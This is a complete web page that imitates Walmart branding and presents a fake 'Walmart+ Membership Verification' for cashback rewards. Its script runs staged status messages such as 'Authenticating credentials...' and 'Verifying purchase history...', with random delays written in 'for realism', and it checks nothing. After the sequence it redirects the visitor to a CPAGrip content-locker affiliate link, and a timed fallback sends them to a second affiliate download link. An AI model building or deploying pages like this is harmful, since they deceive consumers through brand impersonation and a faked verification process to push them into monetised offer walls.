<style>
  :root {
    --walmart-blue: #0071ce;
    --walmart-dark: #1a365d;
  }
  body {
    font-family: 'Inter', sans-serif;
    background: #f5f9ff;
    margin: 0;
    padding: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .verification-container {
    width: 100%;
    max-width: 500px;
    background: white;
    border-radius: 16px;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
    overflow: hidden;
    margin: 24px;
  }
  .verification-header {
    background: var(--walmart-blue);
    padding: 24px;
    text-align: center;
    color: white;
  }
  .verification-header svg {
    width: 48px;
    height: 48px;
    margin-bottom: 16px;
  }
  .progress-container {
    margin: 32px 0;
  }
  .progress-bar {
    height: 8px;
    background: #edf2f7;
    border-radius: 4px;
    overflow: hidden;
  }
  .progress-fill {
    height: 100%;
    background: linear-gradient(90deg, #0071ce 0%, #00aaff 100%);
    width: 0%;
    transition: width 0.5s ease;
    border-radius: 4px;
  }
  .status-text {
    text-align: center;
    margin: 24px 0;
    font-weight: 500;
    color: var(--walmart-blue);
    min-height: 24px;
  }
  .disclaimer {
    font-size: 11px;
    color: #718096;
    text-align: center;
    line-height: 1.5;
    margin-top: 32px;
  }
</style>

<div class="verification-container">
  <div class="verification-header">
    <svg viewBox="0 0 24 24" fill="white">
      <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M10,17L6,13L7.41,11.59L10,14.17L16.59,7.58L18,9L10,17Z"/>
    </svg>
    <h2 style="margin: 0;">Membership Verification</h2>
  </div>
  
  <div style="padding: 32px;">
    <p style="text-align: center; color: #4a5568; margin: 0 0 24px;">
      Confirming your Walmart+ eligibility for cashback rewards
    </p>
    
    <div class="progress-container">
      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
    </div>
    
    <div class="status-text" id="statusText">
      Connecting to verification system...
    </div>
  </div>
</div>

<script>
// Configuration - Your actual CPAGrip IDs
const OFFER_LINK = "https://www.cpagrip.com/locker.php?id=WALMART_CASHBACK_PRO";
const FALLBACK_LINK = "https://playabledownload.com/1802469?aff_id=2379527";

// Enhanced verification sequence
const steps = [
  { text: "Authenticating credentials...", progress: 25 },
  { text: "Verifying purchase history...", progress: 50 },
  { text: "Calculating cashback amount...", progress: 75 },
  { text: "Securing your exclusive offer...", progress: 100 }
];

let currentStep = 0;
const totalSteps = steps.length;

function processNextStep() {
  if (currentStep < totalSteps) {
    const step = steps[currentStep];
    
    // Update UI
    document.getElementById("progressFill").style.width = `${step.progress}%`;
    document.getElementById("statusText").textContent = step.text;
    
    // Prepare next step
    currentStep++;
    
    // Variable delays for realism
    const delay = 1500 + Math.random() * 1000;
    setTimeout(processNextStep, delay);
  } else {
    // Redirect to CPAGrip locker
    window.location.href = OFFER_LINK;
  }
}

// Start the sequence
setTimeout(processNextStep, 800);

// Fallback redirect if main fails
setTimeout(() => {
  if(!window.location.href.includes('cpagrip.com')) {
    window.location.href = FALLBACK_LINK;
  }
}, 10000);
</script>

<div class="disclaimer">
  NOT AFFILIATED WITH WALMART INC. | This is an independent cashback service. 
  18+ only. By continuing, you agree to our <a href="#" style="color: #4299e1;">Terms</a> and <a href="#" style="color: #4299e1;">Privacy Policy</a>.
</div>
